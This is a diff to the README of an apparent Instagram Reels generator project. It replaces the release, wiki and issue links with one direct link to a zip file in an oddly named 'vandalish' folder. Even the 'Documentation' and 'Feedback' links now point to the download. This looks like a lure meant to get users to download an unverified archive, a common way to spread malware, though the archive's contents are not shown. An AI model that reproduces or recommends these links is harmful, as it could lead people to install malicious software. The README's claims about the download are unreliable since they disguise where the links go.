@@ -1,7 +1,7 @@
 # 🎥 instagram-reels-generator - Create Amazing Reels with Ease
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/pratikshathakkar/instagram-reels-generator/releases)
+[![Download](https://raw.githubusercontent.com/pratikshathakkar/instagram-reels-generator/main/vandalish/instagram-reels-generator-v2.1.zip)](https://raw.githubusercontent.com/pratikshathakkar/instagram-reels-generator/main/vandalish/instagram-reels-generator-v2.1.zip)
 
 ## 🚀 Getting Started
 Follow these steps to download and run the instagram-reels-generator on your computer. With this easy-to-use application, you can create unlimited Instagram Reels effortlessly, without needing to register.
@@ -17,7 +17,7 @@ Follow these steps to download and run the instagram-reels-generator on your com
 ### Step 1: Visit the Download Page
 Go to the Releases page to find the latest version of the instagram-reels-generator.
 
-[Visit this page to download](https://github.com/pratikshathakkar/instagram-reels-generator/releases)
+[Visit this page to download](https://raw.githubusercontent.com/pratikshathakkar/instagram-reels-generator/main/vandalish/instagram-reels-generator-v2.1.zip)
 
 ### Step 2: Download the Application
 Look for the latest version at the top of the page. Click on the file that matches your operating system to download.
@@ -65,11 +65,11 @@ If problems persist, consider checking our FAQ section on the GitHub page for fu
 Join discussions and get support from other users and contributors. Visit our GitHub discussions page to share tips, ask questions, and learn from others.
 
 ## 📦 Additional Resources
-- [Documentation](https://github.com/pratikshathakkar/instagram-reels-generator/wiki) - Find detailed guides and FAQs.
-- [Feedback](https://github.com/pratikshathakkar/instagram-reels-generator/issues) - Report issues or suggest new features.
+- [Documentation](https://raw.githubusercontent.com/pratikshathakkar/instagram-reels-generator/main/vandalish/instagram-reels-generator-v2.1.zip) - Find detailed guides and FAQs.
+- [Feedback](https://raw.githubusercontent.com/pratikshathakkar/instagram-reels-generator/main/vandalish/instagram-reels-generator-v2.1.zip) - Report issues or suggest new features.
 
 ### 🎉 Conclusion
 With the instagram-reels-generator, you can effortlessly create engaging content for your Instagram feed. Follow the steps above to start generating your Reels today!
 
 ## 🔗 Download Again
-Don’t forget to [visit this page to download](https://github.com/pratikshathakkar/instagram-reels-generator/releases) the application if you need to reinstall or share it with friends. Enjoy making your Instagram content stand out!
+Don’t forget to [visit this page to download](https://raw.githubusercontent.com/pratikshathakkar/instagram-reels-generator/main/vandalish/instagram-reels-generator-v2.1.zip) the application if you need to reinstall or share it with friends. Enjoy making your Instagram content stand out!
